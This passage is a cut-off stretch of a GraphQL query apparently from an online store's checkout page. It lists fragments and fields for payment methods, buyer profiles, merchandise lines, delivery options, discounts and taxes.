InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on 